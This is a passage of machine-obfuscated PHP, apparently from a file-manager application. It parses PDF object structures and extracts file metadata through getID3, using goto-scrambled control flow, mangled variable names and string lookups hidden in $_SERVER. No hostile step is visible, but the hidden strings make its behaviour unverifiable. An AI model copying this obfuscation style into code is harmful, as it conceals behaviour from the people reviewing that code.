$F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[77]] = intval($fßÁñ‹¢äƒ[1]); } if (preg_match($b…‚±ÆÊáò[1522], $d÷„Ã¦†Ñ‰, $fßÁñ‹¢äƒ) > 0) { $F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[1523]] = intval($fßÁñ‹¢äƒ[1]) . $b…‚±ÆÊáò[70] . intval($fßÁñ‹¢äƒ[2]); } if (preg_match($b…‚±ÆÊáò[1524], $d÷„Ã¦†Ñ‰, $fßÁñ‹¢äƒ) > 0) { $F•‰§ä×[$b…‚±ÆÊáò[1495]][$b…‚±ÆÊáò[1525]] = intval($fßÁñ‹¢äƒ[1]) . $b…‚±ÆÊáò[70] . intval($fßÁñ‹¢äƒ[2]); } goto Cï¨ª––¾µ; AÂôãáÚé£: if ($EäŞ•ğ…Ú•[$b…‚±ÆÊáò[77]] - $EÑÍŠ¢ÚÂ > $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1492]]) { $bŠ‚±Äí„æ = 4 * $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1492]]; $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1492]] = $bŠ‚±Äí„æ; $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1493]] = StreamWrapperIO::read($EäŞ•ğ…Ú•[$b…‚±ÆÊáò[75]], 0, $bŠ‚±Äí„æ); $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1494]] = StreamWrapperIO::read($EäŞ•ğ…Ú•[$b…‚±ÆÊáò[75]], $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[77]] - $bŠ‚±Äí„æ, $bŠ‚±Äí„æ); $dé¬æ’áÃç = $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1494]]; } $c‹ÃÍ½òö = 0; preg_match_all($b…‚±ÆÊáò[1516], $dé¬æ’áÃç, $fßÁñ‹¢äƒ); goto d»Â½ŒË›Å; DŠ¡ŸÎ×àÎ: $A“Ú£Ìµï = $b…‚±ÆÊáò[1515]; if (!preg_match_all($A“Ú£Ìµï, $dé¬æ’áÃç, $fßÁñ‹¢äƒ, PREG_SET_ORDER, 0)) { return !1; } $EÑÍŠ¢ÚÂ = intval($fßÁñ‹¢äƒ[0][1]); goto AÂôãáÚé£; d»Â½ŒË›Å: foreach ($fßÁñ‹¢äƒ[3] as $Bë††ò¶‚ => $B“ÏõÚ—) { if ($fßÁñ‹¢äƒ[3][$Bë††ò¶‚] == $b…‚±ÆÊáò[1517]) { $E•‰ë“—À = $c‹ÃÍ½òö . $b…‚±ÆÊáò[70] . intval($fßÁñ‹¢äƒ[2][$Bë††ò¶‚]); $F•‰§ä×[$b…‚±ÆÊáò[1514]][$E•‰ë“—À] = intval($fßÁñ‹¢äƒ[1][$Bë††ò¶‚]); ++$c‹ÃÍ½òö; } else { if ($fßÁñ‹¢äƒ[3][$Bë††ò¶‚] == $b…‚±ÆÊáò[1518]) { ++$c‹ÃÍ½òö; } else { } } } if (preg_match_all($b…‚±ÆÊáò[1519], $dé¬æ’áÃç, $fßÁñ‹¢äƒ)) { $Bñ­É½¼Ë = $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[77]] - $EäŞ•ğ…Ú•[$b…‚±ÆÊáò[1492]]; foreach ($fßÁñ‹¢äƒ[0] as $Bë††ò¶‚ => $Cƒ¹‡·Ãòƒ) { $C„ªàó¥Ø = $fßÁñ‹¢äƒ[1][$Bë††ò¶‚] . $b…‚±ÆÊáò[70] . $fßÁñ‹¢äƒ[2][$Bë††ò¶‚]; $F•‰§ä×[$b…‚±ÆÊáò[1514]][$C„ªàó¥Ø] = strpos($dé¬æ’áÃç, $Cƒ¹‡·Ãòƒ) + $Bñ­É½¼Ë + 1; } } if (preg_match_all($b…‚±ÆÊáò[1520], $dé¬æ’áÃç, $fßÁñ‹¢äƒ)) { $d÷„Ã¦†Ñ‰ = count($fßÁñ‹¢äƒ[1]) == 1 ? $fßÁñ‹¢äƒ[1][0] : $fßÁñ‹¢äƒ[1][1]; } else { $d÷„Ã¦†Ñ‰ = substr($dé¬æ’áÃç, -1024 * 5); } goto e‹–ˆÈë¯à; F¿ôºñâ‚à: } private static function getObjectValue($Ašïğò£Éá, $A¥È„ÉµŞÍ, $a Æ³¼ŠÇæ) { goto E ¹†ìóÌ; D—ÓÏÙ¥ïŞ: return $Bñ«îó¡Ñ‰; goto c«±¡‹…»…; E ¹†ìóÌ: $C©”ƒÔù‹» =& $_SERVER[£ü]; $fîµğ‡ŸŒ = self::getObject($Ašïğò£Éá, $A¥È„ÉµŞÍ[$C©”ƒÔù‹»[1514]][$a Æ³¼ŠÇæ]); if (is_string($fîµğ‡ŸŒ[1])) { return $fîµğ‡ŸŒ[1]; } goto DæÊ¼¬…±Á; DæÊ¼¬…±Á: if (!is_array($fîµğ‡ŸŒ[1])) { return array(); } $Bñ«îó¡Ñ‰ = array(); for ($DõºŞ¯Â¶ = 0; $DõºŞ¯Â¶ < count($fîµğ‡ŸŒ[1]); $DõºŞ¯Â¶ += 2) { $EÈøÎ˜£® = $fîµğ‡ŸŒ[1][$DõºŞ¯Â¶]; $D‘ÉÍ¦ˆ’ = $fîµğ‡ŸŒ[1][$DõºŞ¯Â¶ + 1]; if (count($EÈøÎ˜£®) == 3 && $EÈøÎ˜£®[0] == $C©”ƒÔù‹»[8]) { $fÍ¸¥õÁá“ = !1; if ($D‘ÉÍ¦ˆ’[0] == $C©”ƒÔù‹»[1529]) { $D‘ÉÍ¦ˆ’ = self::getObject($Ašïğò£Éá, $A¥È„ÉµŞÍ[$C©”ƒÔù‹»[1514]][$D‘ÉÍ¦ˆ’[1]]); } $fÍ¸¥õÁá“ = $D‘ÉÍ¦ˆ’[1]; if ($fÍ¸¥õÁá“ === !1) { continue; } if (is_string($fÍ¸¥õÁá“)) { $fÍ¸¥õÁá“ = self::decodeStr($fÍ¸¥õÁá“); } $Bñ«îó¡Ñ‰[$EÈøÎ˜£®[1]] = $fÍ¸¥õÁá“; } } goto D—ÓÏÙ¥ïŞ; c«±¡‹…»…: } private static function getObject($F—¶ØÆ­”›, $AæÑ‰ƒš÷) { $DÒ¥èç›Ü˜ = self::getObjectItem($F—¶ØÆ­”›, $AæÑ‰ƒš÷); $DÒ¥èç›Ü˜ = self::getObjectItem($F—¶ØÆ­”›, $DÒ¥èç›Ü˜[2]); return $DÒ¥èç›Ü˜; } private static function getObjectItem($e¨ˆËƒ§èÍ, $A¼ÀêêîÂ½) { goto BÇ›’œŒÜ¢; BÇ›’œŒÜ¢: $A³¾±À«½’ =& $_SERVER[£ü]; $b¢šŠÈ¨…¸ = $e¨ˆËƒ§èÍ[$A³¾±À«½’[1492]]; $D±¡îĞ‘°… = $e¨ˆËƒ§èÍ[$A³¾±À«½’[77]] - $b¢šŠÈ¨…¸; goto FÔÏç›ŞØ; Câ¾¨ã¶ß¡: $d½™‚°º†‚ = self::getRawObject($B½ÛœàïË, $Bšçë—Ø); if ($A¼ÀêêîÂ½ >= $D±¡îĞ‘°…) { $d½™‚°º†‚[2] = $d½™‚°º†‚[2] + $D±¡îĞ‘°…; } else { if ($A¼ÀêêîÂ½ > $b¢šŠÈ¨…¸ && $A¼ÀêêîÂ½ <= $D±¡îĞ‘°…) { $d½™‚°º†‚[2] = $d½™‚°º†‚[2] + $A¼ÀêêîÂ½; } } return $d½™‚°º†‚; goto bª‚¾¸Õá”; FÔÏç›ŞØ: $Bšçë—Ø = $A¼ÀêêîÂ½ >= $D±¡îĞ‘°… ? $A¼ÀêêîÂ½ - $D±¡îĞ‘°… : $A¼ÀêêîÂ½; $B½ÛœàïË = $A¼ÀêêîÂ½ >= $D±¡îĞ‘°… ? $e¨ˆËƒ§èÍ[$A³¾±À«½’[1494]] : $e¨ˆËƒ§èÍ[$A³¾±À«½’[1493]]; if ($A¼ÀêêîÂ½ > $b¢šŠÈ¨…¸ && $A¼ÀêêîÂ½ <= $D±¡îĞ‘°…) { $Bšçë—Ø = 0; $B½ÛœàïË = StreamWrapperIO::read($e¨ˆËƒ§èÍ[$A³¾±À«½’[75]], $A¼ÀêêîÂ½, $b¢šŠÈ¨…¸); } goto Câ¾¨ã¶ß¡; bª‚¾¸Õá”: } private static function decodeStr($a›Òù–¤å) { goto eƒ¿Í‡¸òÑ; fµˆÊÙ¿: return $a›Òù–¤å; goto c­Î¸Ó„ŒÀ; eƒ¿Í‡¸òÑ: $FÃ²™¥¼‰ =& $_SERVER[£ü]; $a›Òù–¤å = str_replace(array($FÃ²™¥¼‰[1530], $FÃ²™¥¼‰[1531], $FÃ²™¥¼‰[1532], $FÃ²™¥¼‰[1533], $FÃ²™¥¼‰[1534], $FÃ²™¥¼‰[1535], $FÃ²™¥¼‰[1536], $FÃ²™¥¼‰[1537]), array($FÃ²™¥¼‰[95], $FÃ²™¥¼‰[50], $FÃ²™¥¼‰[8], $FÃ²™¥¼‰[245], $FÃ²™¥¼‰[807], $FÃ²™¥¼‰[214], $FÃ²™¥¼‰[980], $FÃ²™¥¼‰[327]), $a›Òù–¤å); $fÏ¬­°ğ = preg_split($FÃ²™¥¼‰[1538], $a›Òù–¤å, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto eØ³¿ŞÒ©; b§‘“Ö¹¦ù: $a›Òù–¤å = $FÃ²™¥¼‰[33]; foreach ($fÏ¬­°ğ as $b¨¾†¼Ïëä) { if (preg_match($FÃ²™¥¼‰[1544], $b¨¾†¼Ïëä) && !1 === stripos($b¨¾†¼Ïëä, $FÃ²™¥¼‰[1545])) { $b¨¾†¼Ïëä = preg_replace($FÃ²™¥¼‰[1546], $FÃ²™¥¼‰[33], $b¨¾†¼Ïëä); $b¨¾†¼Ïëä = trim($b¨¾†¼Ïëä, $FÃ²™¥¼‰[916]); $b¨¾†¼Ïëä = pack($FÃ²™¥¼‰[1547], $b¨¾†¼Ïëä); $a›Òù–¤å .= $b¨¾†¼Ïëä; } else { $a›Òù–¤å .= $b¨¾†¼Ïëä; } } if (preg_match($FÃ²™¥¼‰[1548], $a›Òù–¤å)) { $f°©”ë‘‘ = substr($a›Òù–¤å, 2); $a›Òù–¤å = $FÃ²™¥¼‰[33]; $CÜ‡©·Îø = strlen($f°©”ë‘‘); for ($bµâ“˜»œ§ = 0; $bµâ“˜»œ§ < $CÜ‡©·Îø; $bµâ“˜»œ§ += 2) { $eó‡‰èœñ = hexdec(bin2hex(substr($f°©”ë‘‘, $bµâ“˜»œ§, 2))); $a›Òù–¤å .= mb_convert_encoding($FÃ²™¥¼‰[1549] . intval($eó‡‰èœñ) . $FÃ²™¥¼‰[67], $FÃ²™¥¼‰[1550], $FÃ²™¥¼‰[1551]); } } goto fµˆÊÙ¿; DÜÃ­ØËÀ: $a›Òù–¤å = $FÃ²™¥¼‰[33]; foreach ($fÏ¬­°ğ as $b¨¾†¼Ïëä) { if (preg_match($FÃ²™¥¼‰[1541], $b¨¾†¼Ïëä)) { $a›Òù–¤å .= \chr(hexdec(trim($b¨¾†¼Ïëä, $FÃ²™¥¼‰[1542]))); } else { $a›Òù–¤å .= $b¨¾†¼Ïëä; } } $fÏ¬­°ğ = preg_split($FÃ²™¥¼‰[1543], $a›Òù–¤å, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b§‘“Ö¹¦ù; eØ³¿ŞÒ©: $a›Òù–¤å = $FÃ²™¥¼‰[33]; foreach ($fÏ¬­°ğ as $b¨¾†¼Ïëä) { if (preg_match($FÃ²™¥¼‰[1539], $b¨¾†¼Ïëä)) { $a›Òù–¤å .= \chr(octdec(trim($b¨¾†¼Ïëä, $FÃ²™¥¼‰[95]))); } else { $a›Òù–¤å .= $b¨¾†¼Ïëä; } } $fÏ¬­°ğ = preg_split($FÃ²™¥¼‰[1540], $a›Òù–¤å, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto DÜÃ­ØËÀ; c­Î¸Ó„ŒÀ: } private static function getRawObject($aõ—ø«øÌ, $Dè½¼ÒÙèá = 0) { goto Bœ‰ÓÉÈ; Eßõ¨¬÷ó…: return array($A¥Íãä¿–¼, $DŸŒ®¦‘§, $Dè½¼ÒÙèá); goto cƒ’ğÀÕğ¸; Bœ‰ÓÉÈ: $e²ãïÕ¥Ö² =& $_SERVER[£ü]; $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[33]; $DŸŒ®¦‘§ = $e²ãïÕ¥Ö²[33]; goto eŞŠ¥Úìæ›; eŞŠ¥Úìæ›: $Dè½¼ÒÙèá += strspn($aõ—ø«øÌ, $e²ãïÕ¥Ö²[1552], $Dè½¼ÒÙèá); $fïó¯¼ÖŒÍ = $aõ—ø«øÌ[$Dè½¼ÒÙèá]; switch ($fïó¯¼ÖŒÍ) { case $e²ãïÕ¥Ö²[1553]: $B‚Å­ĞÈñ† = strcspn($aõ—ø«øÌ, $e²ãïÕ¥Ö²[1554], $Dè½¼ÒÙèá); if ($B‚Å­ĞÈñ† > 0) { $Dè½¼ÒÙèá += $B‚Å­ĞÈñ†; return self::getRawObject($aõ—ø«øÌ, $Dè½¼ÒÙèá); } break; case $e²ãïÕ¥Ö²[8]: $A¥Íãä¿–¼ = $fïó¯¼ÖŒÍ; ++$Dè½¼ÒÙèá; $d£Äİ©Íß© = preg_match($e²ãïÕ¥Ö²[1555], substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 256), $B¨Ë ); if (1 == $d£Äİ©Íß©) { $DŸŒ®¦‘§ = $B¨Ë [1]; $Dè½¼ÒÙèá += strlen($DŸŒ®¦‘§); } break; case $e²ãïÕ¥Ö²[245]: case $e²ãïÕ¥Ö²[807]: $A¥Íãä¿–¼ = $fïó¯¼ÖŒÍ; ++$Dè½¼ÒÙèá; $f¥ª¸‹à¨ = $Dè½¼ÒÙèá; if ($e²ãïÕ¥Ö²[245] == $fïó¯¼ÖŒÍ) { $B÷Íˆö§à = 1; while ($B÷Íˆö§à > 0) { if (!isset($aõ—ø«øÌ[$f¥ª¸‹à¨])) { break; } $Bë¹”‹ = $aõ—ø«øÌ[$f¥ª¸‹à¨]; switch ($Bë¹”‹) { case $e²ãïÕ¥Ö²[95]: ++$f¥ª¸‹à¨; break; case $e²ãïÕ¥Ö²[245]: ++$B÷Íˆö§à; break; case $e²ãïÕ¥Ö²[807]: --$B÷Íˆö§à; break; } ++$f¥ª¸‹à¨; } $DŸŒ®¦‘§ = substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, $f¥ª¸‹à¨ - $Dè½¼ÒÙèá - 1); $Dè½¼ÒÙèá = $f¥ª¸‹à¨; } break; case $e²ãïÕ¥Ö²[154]: case $e²ãïÕ¥Ö²[472]: $A¥Íãä¿–¼ = $fïó¯¼ÖŒÍ; ++$Dè½¼ÒÙèá; if ($e²ãïÕ¥Ö²[154] == $fïó¯¼ÖŒÍ) { $DŸŒ®¦‘§ = array(); do { $EŒ‡¼Æ¯ßÔ = $Dè½¼ÒÙèá; $f‘Æ³ è¶“ = self::getRawObject($aõ—ø«øÌ, $Dè½¼ÒÙèá); $Dè½¼ÒÙèá = $f‘Æ³ è¶“[2]; $DŸŒ®¦‘§[] = $f‘Æ³ è¶“; } while ($e²ãïÕ¥Ö²[472] != $f‘Æ³ è¶“[0] && $Dè½¼ÒÙèá != $EŒ‡¼Æ¯ßÔ); array_pop($DŸŒ®¦‘§); } break; case $e²ãïÕ¥Ö²[915]: case $e²ãïÕ¥Ö²[918]: if (isset($aõ—ø«øÌ[$Dè½¼ÒÙèá + 1]) && $aõ—ø«øÌ[$Dè½¼ÒÙèá + 1] == $fïó¯¼ÖŒÍ) { $A¥Íãä¿–¼ = $fïó¯¼ÖŒÍ . $fïó¯¼ÖŒÍ; $Dè½¼ÒÙèá += 2; if ($e²ãïÕ¥Ö²[915] == $fïó¯¼ÖŒÍ) { $DŸŒ®¦‘§ = array(); do { $EŒ‡¼Æ¯ßÔ = $Dè½¼ÒÙèá; $f‘Æ³ è¶“ = self::getRawObject($aõ—ø«øÌ, $Dè½¼ÒÙèá); $Dè½¼ÒÙèá = $f‘Æ³ è¶“[2]; $DŸŒ®¦‘§[] = $f‘Æ³ è¶“; } while ($e²ãïÕ¥Ö²[1556] != $f‘Æ³ è¶“[0] && $Dè½¼ÒÙèá != $EŒ‡¼Æ¯ßÔ); array_pop($DŸŒ®¦‘§); } } else { $A¥Íãä¿–¼ = $fïó¯¼ÖŒÍ; ++$Dè½¼ÒÙèá; $d£Äİ©Íß© = preg_match($e²ãïÕ¥Ö²[1557], substr($aõ—ø«øÌ, $Dè½¼ÒÙèá), $B¨Ë ); if ($e²ãïÕ¥Ö²[915] == $fïó¯¼ÖŒÍ && 1 == $d£Äİ©Íß©) { $DŸŒ®¦‘§ = strtr($B¨Ë [1], $e²ãïÕ¥Ö²[1558], $e²ãïÕ¥Ö²[33]); $Dè½¼ÒÙèá += \strlen($B¨Ë [0]); } elseif (!1 !== ($D‰ÉÄ°ˆ¥ = strpos($aõ—ø«øÌ, $e²ãïÕ¥Ö²[918], $Dè½¼ÒÙèá))) { $Dè½¼ÒÙèá = $D‰ÉÄ°ˆ¥ + 1; } } break; default: if ($e²ãïÕ¥Ö²[1559] == substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 6)) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1559]; $Dè½¼ÒÙèá += 6; } elseif ($e²ãïÕ¥Ö²[101] == substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 4)) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[101]; $Dè½¼ÒÙèá += 4; $DŸŒ®¦‘§ = $e²ãïÕ¥Ö²[101]; } elseif ($e²ãïÕ¥Ö²[1560] == substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 4)) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1561]; $Dè½¼ÒÙèá += 4; $DŸŒ®¦‘§ = $e²ãïÕ¥Ö²[1560]; } elseif ($e²ãïÕ¥Ö²[1562] == substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 5)) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1561]; $Dè½¼ÒÙèá += 5; $DŸŒ®¦‘§ = $e²ãïÕ¥Ö²[1562]; } elseif ($e²ãïÕ¥Ö²[1563] == substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 6)) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1563]; $Dè½¼ÒÙèá += 6; if (1 == preg_match($e²ãïÕ¥Ö²[1564], substr($aõ—ø«øÌ, $Dè½¼ÒÙèá), $B¨Ë )) { $Dè½¼ÒÙèá += strlen($B¨Ë [0]); $bƒœøÕ½Ú¦ = $e²ãïÕ¥Ö²[1565]; $d£Äİ©Íß© = preg_match($bƒœøÕ½Ú¦, substr($aõ—ø«øÌ, $Dè½¼ÒÙèá), $B¨Ë , PREG_OFFSET_CAPTURE); if (1 == $d£Äİ©Íß©) { $DŸŒ®¦‘§ = substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, $B¨Ë [0][1]); $Dè½¼ÒÙèá += $B¨Ë [1][1]; } } } elseif ($e²ãïÕ¥Ö²[1566] == substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 9)) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1566]; $Dè½¼ÒÙèá += 9; } elseif (1 == preg_match($e²ãïÕ¥Ö²[1567], substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 33), $B¨Ë )) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1529]; $Dè½¼ÒÙèá += strlen($B¨Ë [0]); $DŸŒ®¦‘§ = intval($B¨Ë [1]) . $e²ãïÕ¥Ö²[70] . intval($B¨Ë [2]); } elseif (1 == preg_match($e²ãïÕ¥Ö²[1568], substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, 33), $B¨Ë )) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1569]; $DŸŒ®¦‘§ = intval($B¨Ë [1]) . $e²ãïÕ¥Ö²[70] . intval($B¨Ë [2]); $Dè½¼ÒÙèá += strlen($B¨Ë [0]); } elseif (($fÔ¢ä”§Ï = strspn($aõ—ø«øÌ, $e²ãïÕ¥Ö²[1570], $Dè½¼ÒÙèá)) > 0) { $A¥Íãä¿–¼ = $e²ãïÕ¥Ö²[1571]; $DŸŒ®¦‘§ = substr($aõ—ø«øÌ, $Dè½¼ÒÙèá, $fÔ¢ä”§Ï); $Dè½¼ÒÙèá += $fÔ¢ä”§Ï; } break; } goto Eßõ¨¬÷ó…; cƒ’ğÀÕğ¸: } } class GetInfo { private static $fileTypeArray; public static function get($B‚¾„ÀŠ¼) { $f×…ãÓœ­ = IO::info($B‚¾„ÀŠ¼); return self::infoAdd($f×…ãÓœ­); } public static function infoAdd(&$c¬©©Å¬ĞÛ) { goto Cî—©ÛÈ±’; Cî—©ÛÈ±’: $F›Ì£ÃèŠ‚ =& $_SERVER[£ü]; static $F®ˆ“ÆÊ£¢; if (!$F®ˆ“ÆÊ£¢) { require SDK_DIR . $F›Ì£ÃèŠ‚[1572]; $F®ˆ“ÆÊ£¢ = new getID3(); } goto c”Éàõ–´½; cÉéÒÂ”Œ­: $f…Â˜æ¡ææ = $c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[157]]; try { if ($c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[157]] == $F›Ì£ÃèŠ‚[1574]) { $AÁ¡Æ›ƒ‚Ò = self::psdParse($eÊÌå˜ºÖæ); $f…Â˜æ¡ææ = $F›Ì£ÃèŠ‚[1575]; } else { if ($c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[157]] == $F›Ì£ÃèŠ‚[1576]) { $AÁ¡Æ›ƒ‚Ò = self::pdfParse($eÊÌå˜ºÖæ); } else { $f…Â˜æ¡ææ = self::$fileTypeArray[$F›Ì£ÃèŠ‚[1577]][$c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[157]]]; $Fâ¯®Ó¯ÙÖ = self::$fileTypeArray[$F›Ì£ÃèŠ‚[1578]][$f…Â˜æ¡ææ][$F›Ì£ÃèŠ‚[1579]]; $e™¬ƒŠÎ¨Â = @$F®ˆ“ÆÊ£¢->analyze($eÊÌå˜ºÖæ, $c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[77]], $c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[28]]); $AÁ¡Æ›ƒ‚Ò = self::parseData($e™¬ƒŠÎ¨Â, $Fâ¯®Ó¯ÙÖ, $c¬©©Å¬ĞÛ); } } } catch (Exception $Eãƒ†ğ…Ë) { $AÁ¡Æ›ƒ‚Ò = array($F›Ì£ÃèŠ‚[369] => $f…Â˜æ¡ææ); } if (!$AÁ¡Æ›ƒ‚Ò) { return; } goto f°Üªß¨Ûœ; c”Éàõ–´½: if (!$c¬©©Å¬ĞÛ || $c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[29]] != $F›Ì£ÃèŠ‚[164]) { return; } if (!self::support($c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[157]]) || isset($c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[422]])) { return; } $eÊÌå˜ºÖæ = $F›Ì£ÃèŠ‚[1573] . $c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[75]]; goto cÉéÒÂ”Œ­; f°Üªß¨Ûœ: $AÁ¡Æ›ƒ‚Ò[$F›Ì£ÃèŠ‚[369]] = $f…Â˜æ¡ææ; $c¬©©Å¬ĞÛ[$F›Ì£ÃèŠ‚[422]] = $AÁ¡Æ›ƒ‚Ò; return $c¬©©Å¬ĞÛ; goto Eˆ¼öÃâï; Eˆ¼öÃâï: } public static function support($D™²¬–ˆÍ‡) { goto EøĞÁ—ÒøÁ; CÂˆ‘¥Š: return !1; goto b¢ôêƒó´£; EøĞÁ—ÒøÁ: $Dñ´…ö„æ· =& $_SERVER[£ü]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $D™²¬–ˆÍ‡ = strtolower($D™²¬–ˆÍ‡); goto aÀ‰’šÈùã; aÀ‰’šÈùã: $FÛµºä‘‡ = array($Dñ´…ö„æ·[1576], $Dñ´…ö„æ·[1574]); if (in_array($D™²¬–ˆÍ‡, $FÛµºä‘‡)) { return !0; } if (isset(self::$fileTypeArray[$Dñ´…ö„æ·[1577]][$D™²¬–ˆÍ‡])) { return !0; } goto CÂˆ‘¥Š; b¢ôêƒó´£: } private static function parseData($E˜È«Îñ«Û, $a¾­“±é„ù, $aŒáœÀˆ¨) { $AÉ‹áÙ‘¨ =& $_SERVER[£ü]; $cµâê²„®… = $E˜È«Îñ«Û[$AÉ‹áÙ‘¨[1580]]; $c’ôŠ¬ÉÁ™ = array(); foreach ($a¾­“±é„ù as $Fµ‘°¦†˜¬ => $C¸½·ñà) { foreach ($C¸½·ñà as $a²•¡‡Ü‰) { if (is_array($a²•¡‡Ü‰)) { $eµÂ’Ñíë = self::parseData($E˜È«Îñ«Û, $C¸½·ñà, $aŒáœÀˆ¨); if ($eµÂ’Ñíë) { $c’ôŠ¬ÉÁ™[$Fµ‘°¦†˜¬] = $eµÂ’Ñíë; } break; } $E¥óŞ÷Ÿ = str_replace($AÉ‹áÙ‘¨[1354], $cµâê²„®…, $a²•¡‡Ü‰); $eµÂ’Ñíë = _get($E˜È«Îñ«Û, $E¥óŞ÷Ÿ); $eµÂ’Ñíë = is_array($eµÂ’Ñíë) ? $eµÂ’Ñíë[0] : $eµÂ’Ñíë; if ($eµÂ’Ñíë) { break; } } if ($eµÂ’Ñíë || $eµÂ’Ñíë === 0 || $eµÂ’Ñíë === !1) { $eµÂ’Ñíë = self::valueReset($a²•¡‡Ü‰, $eµÂ’Ñíë, $Fµ‘°¦†˜¬); if ($eµÂ’Ñíë !== null) { $c’ôŠ¬ÉÁ™[$Fµ‘°¦†˜¬] = $eµÂ’Ñíë; } } } $c’ôŠ¬ÉÁ™ = self::valueResetAll($c’ôŠ¬ÉÁ™, $aŒáœÀˆ¨); return $c’ôŠ¬ÉÁ™; } private static function psdParse($BÑ‹æ¯¿¨Ì) { $Dãø¢Ü¥Ë° =& $_SERVER[£ü]; if (IO::fileSubstr($BÑ‹æ¯¿¨Ì, 0, 4) != $Dãø¢Ü¥Ë°[1581]) { return !1; } $f§ÈÉŠöŞ½ = getImageSize($BÑ‹æ¯¿¨Ì, $d¿ğÅ§¢ôŒ); if (!$f§ÈÉŠöŞ½) { return; } $AùÜ…—ñ‚ï = array($Dãø¢Ü¥Ë°[1496] => $f§ÈÉŠöŞ½[0], $Dãø¢Ü¥Ë°[1498] => $f§ÈÉŠöŞ½[1]); return $AùÜ…—ñ‚ï; } private static function pdfParse($AÖÎŠ§æÎ) { return FileParsePdf::parse($AÖÎŠ§æÎ); } private static function fileTypeParse() { $bÔ—Ëóƒ¨ =& $_SERVER[£ü]; $dëÎÔó­Ï = self::fileTypeArray(); $e£‘ĞÆÃ¥ = array(); foreach ($dëÎÔó­Ï as $AŒ‰ÙÄà¶ => $EöæÖÍ¾ ) { $BË¹ŒôíÁ = _get($EöæÖÍ¾ , $bÔ—Ëóƒ¨[157], $bÔ—Ëóƒ¨[33]); $aóÜá¶©Ùç = is_string($BË¹ŒôíÁ) ? explode($bÔ—Ëóƒ¨[47], $BË¹ŒôíÁ) : $BË¹ŒôíÁ; if (!$aóÜá¶©Ùç) { continue; } foreach ($aóÜá¶©Ùç as $BË¹ŒôíÁ) { $BË¹ŒôíÁ = strtolower(trim($BË¹ŒôíÁ)); if (!$BË¹ŒôíÁ) { continue; } $e£‘ĞÆÃ¥[$BË¹ŒôíÁ] = $AŒ‰ÙÄà¶; } $dëÎÔó­Ï[$AŒ‰ÙÄà¶][$bÔ—Ëóƒ¨[157]] = array_keys($e£‘ĞÆÃ¥); $dëÎÔó­Ï[$AŒ‰ÙÄà¶][$bÔ—Ëóƒ¨[1579]] = self::parseKeyMap($EöæÖÍ¾ [$bÔ—Ëóƒ¨[1579]]); } return array($bÔ—Ëóƒ¨[1578] => $dëÎÔó­Ï, $bÔ—Ëóƒ¨[1577] => $e£‘ĞÆÃ¥); } private static function parseKeyMap($b²ÇšÂĞÎ¥) { $Dã¢¨ÁÕ¦ =& $_SERVER[£ü]; foreach ($b²ÇšÂĞÎ¥ as $F«§ÙãÛÛ– => $D“‘–È×¸) { if (is_array($D“‘–È×¸)) { $E§ˆğ§øœ = self::parseKeyMap($D“‘–È×¸); if ($E§ˆğ§øœ) { $b²ÇšÂĞÎ¥[$F«§ÙãÛÛ–] = $E§ˆğ§øœ; } continue; } $E¢ÉùÎ½©• = explode($Dã¢¨ÁÕ¦[47], $D“‘–È×¸); $aŸ¹éõØ© = array(); foreach ($E¢ÉùÎ½©• as $B±“ù¶™ƒä) { $B±“ù¶™ƒä = trim($B±“ù¶™ƒä); if (!$B±“ù¶™ƒä) { continue; } if (preg_match($Dã¢¨ÁÕ¦[1582], $B±“ù¶™ƒä, $d¡èºä¸¡ï)) { $c×Û’ì®¢à = explode($Dã¢¨ÁÕ¦[268], $d¡èºä¸¡ï[1]); foreach ($c×Û’ì®¢à as $A ñ’Ä° ) { $aŸ¹éõØ©[] = str_replace($d¡èºä¸¡ï[0], $A ñ’Ä° , $B±“ù¶™ƒä); } } else { $aŸ¹éõØ©[] = $B±“ù¶™ƒä; } } $b²ÇšÂĞÎ¥[$F«§ÙãÛÛ–] = $aŸ¹éõØ©; } return $b²ÇšÂĞÎ¥; } private static function valueResetAll($cÃñ·ÀÎ˜ˆ, $b£æƒºåñÑ) { goto 